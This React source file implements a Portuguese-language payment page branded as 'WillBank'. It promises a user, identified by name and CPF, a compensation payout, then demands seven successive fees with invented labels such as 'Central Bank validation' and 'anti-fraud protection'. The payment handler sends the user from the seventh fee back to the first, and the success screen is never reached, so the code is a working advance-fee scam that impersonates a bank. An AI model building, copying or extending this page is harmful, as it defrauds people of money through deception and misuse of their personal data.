import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CheckCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, clearSession, saveSession } from "@/hooks/useSessionPersistence";

// Define the 7 upsells with their values and descriptions
const UPSELLS = [
  {
    valor: 14.21,
    title: "Taxa de Processamento Prioritário",
    description: "Garanta processamento prioritário da sua indenização e receba antes dos demais beneficiários.",
  },
  {
    valor: 32.98,
    title: "Seguro de Transferência Bancária",
    description: "Proteja sua transferência contra falhas e garanta que o valor chegue com segurança total.",
  },
  {
    valor: 21.30,
    title: "Taxa de Validação Bancária",
    description: "Validação obrigatória junto ao Banco Central para liberação de valores acima de R$ 5.000,00.",
  },
  {
    valor: 28.83,
    title: "Certificado Digital de Autenticidade",
    description: "Documento digital que comprova a autenticidade e legalidade da sua indenização.",
  },
  {
    valor: 13.23,
    title: "Taxa de Liberação Imediata",
    description: "Libere sua indenização imediatamente sem aguardar o prazo padrão de processamento.",
  },
  {
    valor: 11.00,
    title: "Proteção Anti-Fraude Premium",
    description: "Sistema avançado de proteção que garante a segurança total da sua transação.",
  },
  {
    valor: 8.83,
    title: "Taxa de Finalização",
    description: "Última etapa para conclusão do processo e liberação definitiva da sua indenização.",
  },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [currentStep, setCurrentStep] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);

  // Try to get data from location state or session
  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
  const startStep: number = location.state?.upsellStep || 0;

  // Scroll to top on step change
  useEffect(() => {
    window.scrollTo(0, 0);
  }, [currentStep]);

  // Initialize step from location state
  useEffect(() => {
    if (startStep > 0 && startStep < UPSELLS.length) {
      setCurrentStep(startStep);
    }
  }, [startStep]);

  // Redirect if no data
  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Save session with current upsell step
    saveSession({ 
      cpfData, 
      currentStep: "/upsell", 
      valorBeneficio, 
      protocolo 
    });
  }, [cpfData, valorBeneficio, protocolo, navigate]);

  const handlePaymentConfirmed = () => {
    if (currentStep < UPSELLS.length - 1) {
      // Move to next upsell
      setCurrentStep(prev => prev + 1);
    } else {
      // After upsell 7, go back to upsell 1
      setCurrentStep(0);
    }
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
        breadcrumb={`Benefício > Indenização > Etapa ${currentStep + 1}/${UPSELLS.length}`}
      />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        {!isCompleted ? (
          <UpsellStep
            key={currentStep}
            title={UPSELLS[currentStep].title}
            description={UPSELLS[currentStep].description}
            valor={UPSELLS[currentStep].valor}
            cpfData={cpfData}
            protocolo={protocolo || `WB${Date.now()}`}
            onPaymentConfirmed={handlePaymentConfirmed}
            stepNumber={currentStep + 1}
            totalSteps={UPSELLS.length}
          />
        ) : (
          <WillBankCard className="w-full max-w-lg">
            <div className="text-center space-y-6 py-4 animate-scale-in">
              <div className="w-24 h-24 sm:w-28 sm:h-28 mx-auto bg-gradient-to-br from-green-100 to-green-200 rounded-full flex items-center justify-center shadow-lg">
                <CheckCircle className="w-14 h-14 sm:w-16 sm:h-16 text-success" />
              </div>
              
              <div className="space-y-1.5">
                <h1 className="text-xl sm:text-2xl font-bold tracking-tight">Processo Concluído!</h1>
                <p className="text-muted-foreground text-sm">
                  Sua indenização foi aprovada e está sendo processada.
                </p>
              </div>

              <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl sm:rounded-2xl p-4 space-y-3 text-left shadow-sm text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Beneficiário:</span>
                  <span className="font-bold text-right">{cpfData.nome}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">CPF:</span>
                  <span className="font-bold">{cpfData.cpf}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Valor da Indenização:</span>
                  <span className="font-black text-success text-base">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Previsão de Depósito:</span>
                  <span className="font-bold">Até 24h úteis</span>
                </div>
                {protocolo && (
                  <div className="flex justify-between">
                    <span className="text-muted-foreground font-medium">Protocolo:</span>
                    <span className="font-mono text-xs font-bold">{protocolo}</span>
                  </div>
                )}
              </div>

              <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 text-sm text-amber-800">
                <p className="font-medium">📲 Importante!</p>
                <p className="text-xs mt-1">Você receberá uma notificação assim que o valor for depositado na sua conta.</p>
              </div>

              <Button 
                onClick={() => {
                  clearSession();
                  navigate("/");
                }}
                variant="outline"
                className="w-full h-12 rounded-full font-bold text-sm border-2 hover:bg-muted/50 transition-all duration-300"
              >
                Voltar ao início
              </Button>
            </div>
          </WillBankCard>
        )}
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Upsell;
